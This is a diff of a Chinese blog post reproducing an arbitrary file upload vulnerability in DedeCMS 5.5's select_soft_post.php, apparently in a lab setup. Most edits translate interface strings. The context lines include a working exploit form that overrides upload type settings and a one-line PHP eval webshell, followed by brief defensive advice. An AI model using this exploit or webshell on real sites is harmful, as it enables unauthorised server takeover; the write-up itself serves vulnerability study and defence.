@@ -13,7 +13,8 @@
 <meta property="og:site_name" content="青衫磊落">
 <meta property="og:description" content="0x00 背景最近的从防火墙检测流量发现一大波webshell上传威胁告警，指向select_soft_post.php这个文件。查了一下发现是dedecms的一个任意文件上传漏洞，发生在5.5跟5.5final版本。 0x01 准备环境 目前的环境之前一直习惯用xampp，虽然xampp比较稳定，但不支持多版本，更适合做开发及搭建版本稳定的学习环境。做漏洞复现，我们需要PHP运行环境的各种版本，">
 <meta property="og:image" content="http://yoursite.com/2018/10/22/dede-select-soft-post-md/dedecms.png">
-<meta property="og:updated_time" content="2018-10-23T05:49:30.219Z">
+<meta property="og:image" content="http://yoursite.com/2018/10/22/dede-select-soft-post-md/result.png">
+<meta property="og:updated_time" content="2018-10-23T05:51:38.892Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="dedecms5.5文件上传漏洞复现">
 <meta name="twitter:description" content="0x00 背景最近的从防火墙检测流量发现一大波webshell上传威胁告警，指向select_soft_post.php这个文件。查了一下发现是dedecms的一个任意文件上传漏洞，发生在5.5跟5.5final版本。 0x01 准备环境 目前的环境之前一直习惯用xampp，虽然xampp比较稳定，但不支持多版本，更适合做开发及搭建版本稳定的学习环境。做漏洞复现，我们需要PHP运行环境的各种版本，">
@@ -44,7 +45,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -117,13 +118,14 @@
 </ul>
 <p>接下来我们可以通告大佬写的一个表单上传，表单form对应的链接需要修改对应站点域名，然后来上传webshell文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Dedecms v55 RCE Exploit Codz By flyh4t&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body style=&quot;FONT-SIZE: 9pt&quot;&gt;---------- Dedecms v55 RCE Exploit Codz By flyh4t---------- &lt;br /&gt;&lt;br /&gt;</div><div class="line">&lt;form action=http://localhost:8888/dedecms/include/dialog/select_soft_post.php method=&apos;POST&apos; enctype=&quot;multipart/form-data&quot; name=&apos;myform&apos;&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;activepath&apos; value=&apos;/data/cache/&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_basedir&apos; value=&apos;../../&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_imgtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_not_allowall&apos; value=&apos;txt&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_softtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_mediatype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;f&apos; value=&apos;form1.enclosure&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;job&apos; value=&apos;upload&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;newname&apos; value=&apos;fly.php&apos; /&gt;</div><div class="line">Select U Shell &lt;input type=&apos;file&apos; name=&apos;uploadfile&apos; size=&apos;25&apos; /&gt;</div><div class="line">&lt;input type=&apos;submit&apos; name=&apos;sb1&apos; value=&apos;确定&apos; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;br /&gt;It&apos;s just a exp for the bug of Dedecms V55...&lt;br /&gt;</div><div class="line">Need register_globals = on...&lt;br /&gt;Fun the game,get a webshell at /data/cache/fly.php...&lt;br /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>对应的webshell,一句话后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">eval($_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>使用菜刀访问上传的webshell。<br></p>
+<p>使用菜刀访问上传的webshell。</p>
+<img src="/2018/10/22/dede-select-soft-post-md/result.png" alt="result.png" title="">
 <h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从漏洞产生条件上来看，可以关闭global_register功能，当然其他的方法也很多，比如禁止使用select_soft_post页面 </p>
 <h2 id="0x05-更多的利用"><a href="#0x05-更多的利用" class="headerlink" title="0x05 更多的利用"></a>0x05 更多的利用</h2>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/22/dede-select-soft-post-md/" data-id="cjnl8r4pn00048cx7oiecwhbn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/10/22/dede-select-soft-post-md/" data-id="cjnlbp96w0002jux7a77hbsx2" class="article-share-link">分享</a>
       
       
       
@@ -135,7 +137,7 @@
     
  <script src="/jquery/jquery.min.js"></script>
   <div id="random_posts">
-    <h2>Recommended Posts</h2>
+    <h2>推荐文章</h2>
     <div class="random_posts_ul">
       <script>
           var random_count =4
@@ -179,7 +181,7 @@
   
   
     <a href="/2018/05/21/beginners‘python/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
+      <strong class="article-nav-caption">下一篇</strong>
       <div class="article-nav-title">python之解放生产力</div>
     </a>
   
@@ -214,7 +216,7 @@
     
       <div class="widget" id="toc-widget-fixed">
       
-        <strong class="toc-title">Content</strong>
+        <strong class="toc-title">文章目录</strong>
         <div class="toc-widget-list">
               <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-背景"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-准备环境"><span class="toc-number">2.</span> <span class="toc-text">0x01 准备环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-动手搭建"><span class="toc-number">3.</span> <span class="toc-text">0x02 动手搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御"><span class="toc-number">5.</span> <span class="toc-text">0x04 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-更多的利用"><span class="toc-number">6.</span> <span class="toc-text">0x05 更多的利用</span></a></li></ol>
           </div>
@@ -246,10 +248,10 @@
   <div class="outer">
     <div id="footer-left">
       &copy; 2014 - 2018 Fire Xun&nbsp;|&nbsp;
-      Theme by <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
+      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
     </div>
      <div id="footer-right">
-      Contact&nbsp;|&nbsp;xundidi@gmail.com
+      联系方式&nbsp;|&nbsp;xundidi@gmail.com
     </div>
   </div>
 </footer>
